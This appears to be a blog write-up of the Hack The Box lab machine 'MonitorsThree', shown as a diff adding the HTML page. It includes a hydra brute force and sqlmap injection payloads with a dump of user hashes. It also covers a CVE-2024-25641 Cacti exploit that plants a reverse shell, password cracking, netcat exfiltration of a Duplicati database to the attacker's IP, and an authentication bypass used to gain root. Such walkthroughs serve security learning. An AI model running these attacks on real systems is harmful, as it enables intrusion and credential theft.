@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - MonitorsThree - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - MonitorsThree</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1724590551476"
+                  >2024-08-25 14:55</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156119519"
+                  >2025-03-16 21:15</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">sql</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>nmap -A -p- 10.129.186.132
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 12:37 UTC
+Nmap scan report for 10.129.186.132
+Host is up (0.034s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
+|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
+80/tcp   open     http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://monitorsthree.htb/
+8084/tcp filtered websnp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://monitorsthree.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://monitorsthree.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: cacti.monitorsthree.htb Status: 302 [Size: 0] [--&gt; /cacti]</code></pre></div>
+<p><img src="/_resources/59b51422d73041f79314497407150ef4.png" /></p>
+<p>Main page:</p>
+<p><img src="/_resources/6024e87537374c52be376d72318b977d.png" /></p>
+<p>monitorsthree login page:</p>
+<p><img src="/_resources/6c69cce1702d41cb89a43b93e85c27b4.png" /></p>
+<p>We can try resseting passwords and it reveals to us usernames that are on the server.</p>
+<p>Admin is there:</p>
+<p><img src="/_resources/be674f049f1b4c1496256351f924ec3c.png" /></p>
+<p>and test is not there:</p>
+<p><img src="/_resources/0e18f1a9001a4d3fa405d0ac36367205.png" /></p>
+<p>the subdomain gets us Cacti version 1.2.26.</p>
+<p><img src="/_resources/9dea8cf26c354cf3a4df8608efffd9b6.png" /></p>
+<p>Time to start looking for some CVE’s for this “cacti”.</p>
+<p><a title="https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html" href="https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html">https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html</a></p>
+<p>Lookining at exploit-db, NIST and metasploit, everything seems to be out of date or work with valid logins.</p>
+<p>Let’s try to brute force the password then, as we know the login.</p>
+<div><pre class="hljs"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt monitorsthree.htb http-post-form "/login.php:username=admin&amp;password=^PASS^:F=302" -v -f -I</code></pre></div>
+<p>While waiting for it to finish, I run also sqlmap:</p>
+<div><pre class="hljs"><code>sqlmap -r request.txt --batch --level=5 --risk=3</code></pre></div>
+<p>Also running sqlmap against password reset site:</p>
+<div><pre class="hljs"><code>sqlmap -r request.txt -p username --dump-all --dbms=MySQL --level=5 --risk=3
+
+...
+
+sqlmap -r request.txt -p username --dump --dbms=MySQL --level=5 --risk=3
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:38:22 /2024-08-28/
+
+[20:38:22] [INFO] parsing HTTP request from 'request.txt'
+[20:38:22] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[20:38:22] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
+
+...
+
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 691 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=' OR NOT 8192=8192-- CVrj
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=' OR (SELECT 9009 FROM(SELECT COUNT(*),CONCAT(0x7162707a71,(SELECT (ELT(9009=9009,1))),0x716a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CRdp
+
+    Type: stacked queries
+    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
+    Payload: username=';SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=' AND (SELECT 7447 FROM (SELECT(SLEEP(5)))ECXW)-- QaOT
+---
+
+...
+
+Database: monitorsthree_db
+Table: users
+[4 entries]
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
+| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
+| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
+| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
++----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+</code></pre></div>
+<p>Using crackstation we get: <code>31a181c8372e3afc59dab863430610e8 md5 greencacti2001</code></p>
+<p>We are in.</p>
+<p><img src="/_resources/1ffdfc9378264d72a9dfbaea9d03365a.png" /></p>
+<p>Checking these creds also for cacti and we are in once again.</p>
+<p><img src="/_resources/94bb273dcddd4099abda633e4aa3588a.png" /></p>
+<p>We can now get the shell with the CVE.</p>
+<h1 id="cve-2024-25641">CVE-2024-25641</h1>
+<p>Googling gets us:<br />
+<a title="https://github.com/5ma1l/CVE-2024-25641" href="https://github.com/5ma1l/CVE-2024-25641">https://github.com/5ma1l/CVE-2024-25641</a></p>
+<div><pre class="hljs"><code>┌─[✗]─[user@parrot]─[~/Desktop/CVE-2024-25641]
+└──╼ $./exploit.py http://cacti.monitorsthree.htb/cacti/ admin greencacti2001 -p ~/4victim/php-reverse-shell.php
+
+Created by: 5ma1l
+    	Automate the process of exploiting the CVE-2024-25641
+
+
+[*] Login attempts...
+[SUCCESS]
+[*] Creating the gzip...
+[SUCCESS]
+GZIP path is /home/user/Desktop/CVE-2024-25641/rvbwcsivuoeqgipz.php.gz
+[*] Sending payload...
+[SUCCESS]
+You will find the payload in http://cacti.monitorsthree.htb/cacti//resource/rvbwcsivuoeqgipz.php
+Do you wanna start the payload ?[Y/n]Y
+Payload is running...</code></pre></div>
+<p>We are in. Standard shell stabilisation:</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> TERM=xterm
+CTRL-Z
+stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="user">User</h1>
+<p>Looking for config files in <code>/www/html</code>, our usual culprit:</p>
+<p><code>find . -name *config*</code></p>
+<p>Gets us:</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_type</span>     = <span class="hljs-string">'mysql'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_default</span>  = <span class="hljs-string">'cacti'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_hostname</span> = <span class="hljs-string">'localhost'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_username</span> = <span class="hljs-string">'cactiuser'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_password</span> = <span class="hljs-string">'cactiuser'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_port</span>     = <span class="hljs-string">'3306'</span>;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_retries</span>  = 5;</span>
+<span class="hljs-meta">#</span><span class="language-bash"><span class="hljs-variable">$rdatabase_ssl</span>      = <span class="hljs-literal">false</span>;</span></code></pre></div>
+<p>Lets explore the database <code>mysql -u cactiuser -p -h localhost -P 3306 cacti</code>.</p>
+<p><code>select * from user_auth</code></p>
+<div><pre class="hljs"><code><span class="hljs-symbol">1 </span>| admin    | $<span class="hljs-number">2</span>y$<span class="hljs-number">10</span>$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     <span class="hljs-number">0</span> | Administrator | marcus@monitorsthree.htb |
+<span class="hljs-symbol">3 </span>| guest    | $<span class="hljs-number">2</span>y$<span class="hljs-number">10</span>$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     <span class="hljs-number">0</span> | Guest Account | guest@monitorsthree.htb  |
+<span class="hljs-symbol">4 </span>| marcus   | $<span class="hljs-number">2</span>y$<span class="hljs-number">10</span>$Fq8wGXvlM3Le.<span class="hljs-number">5</span>LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     <span class="hljs-number">0</span> | Marcus        | marcus@monitorsthree.htb |  </code></pre></div>
+<p>Lets get cracking with john:</p>
+<div><pre class="hljs"><code>$john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash  
+Using <span class="hljs-keyword">default</span> input encoding: UTF-<span class="hljs-number">8</span>
+Loaded <span class="hljs-number">1</span> password hash (bcrypt [Blowfish <span class="hljs-number">32</span>/<span class="hljs-number">64</span> X3])
+Cost <span class="hljs-number">1</span> (iteration <span class="hljs-keyword">count</span>) is <span class="hljs-number">1024</span> <span class="hljs-keyword">for</span> all loaded hashes
+Will run <span class="hljs-number">8</span> OpenMP threads
+Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status
+<span class="hljs-number">12345678910</span>      (?)  </code></pre></div>
+<p><code>su marcus</code> gets us the flag.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Checking all of the ports with <code>ss -tuln</code> gives:</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">Active</span> Internet connections (only servers)
+<span class="hljs-attribute">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State      
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:80</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.53:53</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:22</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:8200</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:33029</span>         <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3306</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:8084</span>            <span class="hljs-number">0.0.0.0</span>:*               LISTEN     
+<span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN     
+<span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN     
+<span class="hljs-attribute">udp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.53:53</span>           <span class="hljs-number">0.0.0.0</span>:*                          
+<span class="hljs-attribute">udp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:68</span>              <span class="hljs-number">0.0.0.0</span>:*       </code></pre></div>
+<p>Lets check what is on this port:<br />
+<code>socat TCP-LISTEN:8080,fork TCP:localhost:8200</code></p>
+<p><img src="/_resources/46535029528a4d659d4d900ff15028ac.png" /></p>
+<p>Checking if there is anything on the server about “Duplicati”. <code>/opt/duplicati/config</code> has a bunch of interesting files including Duplicati-server.sqlite. Let’s send it back to us using netcat:</p>
+<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">on victim</span>
+nc 10.10.14.134 2222 &lt; Duplicati-server.sqlite
+<span class="hljs-meta">
+# </span><span class="language-bash">on host</span>
+nc -l -p 2222 &gt; received_file</code></pre></div>
+<p>In the option table we can find server passphrase and its salt.</p>
+<p><img src="/_resources/3677f8321ed2475a8e221436750b06f0.png" /></p>
+<p>pass: Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=<br />
+salt: xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=</p>
+<p>Checking the logging screen with burp gets us the same salt.</p>
+<p><img src="/_resources/eca14d6cb2e54a45bdc9261660ee644e.png" /></p>
+<p>To get it decrypted, we can need to learn what it is first.<br />
+<a title="https://hashes.com/en/tools/hash_identifier" href="https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</a></p>
+<p><img src="/_resources/3ccd8da8f70c42c68b30725ab8cad3dd.png" /></p>
+<p>We can reverse this process using cyberchef:</p>
+<p>pass: 59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a<br />
+salt: c537f29165757404e9159bcf84294424b273600e40e0bef8857ec52bc5e66342</p>
+<p>Couldnt decrypt it with john in reasonable amount of time, so decided to <a title="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee" href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">learn more about duplicati</a>.</p>
+<p><img src="/_resources/463a5cc3a0164e57b0d0b038c7ee3654.png" /></p>
+<p><a title="https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('None',0)&amp;input=V2I2ZTg1NUwzc045TFRhQ3V3UFh1YXV0c3dUSVFiZWttTUFyN0JySzJIbw" href="https://cyberchef.org/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true,false%29To_Hex%28%27None%27,0%29&amp;input=V2I2ZTg1NUwzc045TFRhQ3V3UFh1YXV0c3dUSVFiZWttTUFyN0JySzJIbw">cyberchef conversion of passwd</a></p>
+<p><img src="/_resources/e247610e0a3c4f8f864c794ab00a6e92.png" /></p>
+<p>Encode it with ctrl+u and send.</p>
+<p><img src="/_resources/a683ca5e05434d12b5216c128018af75.png" /></p>
+<p>We are in.</p>
+<p><img src="/_resources/47786839f1cb4eb2b025046bfe4f90ab.png" /></p>
+<p>I was stumbling here for a while, trying to create a backup with root folder. Only later did I discover, that the main folder shown for backups is the docker system and <strong>our system is under source folder</strong>.</p>
+<p>Tried creating backup there then:</p>
+<p><img src="/_resources/a4813dee0a1c46aeb1045a5fa4e840aa.png" /></p>
+<p><img src="/_resources/cc4d10013f8d40fe80cc0fa6ba175943.png" /></p>
+<p>We get can now copy it to our machine, unzip and get the flag.<br />
+Looking at the root we can also find password for duplicati <code>MonitorsThreeDuplicatiBackupPassword2024</code>.</p>
+<p><img src="/_resources/6ca1e9f2da1b4a41bad848498681e334.png" /></p>
+<p>Now time to get real root.</p>
+<p>Lets backup our ssh keys first:</p>
+<p><img src="/_resources/3109479d80654af6a2995947f83bac12.png" /></p>
+<p>Then restore them to root:</p>
+<p><img src="/_resources/c02b30912e174b10b3f7888f98d136f6.png" /></p>
+<p><img src="/_resources/e081ca5b2495413fa47b60173ca1137e.png" /></p>
+<p>We can now connect via ssh to root.</p>
+<p><img src="/_resources/08fb154ab91544008da7915f64c781d5.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
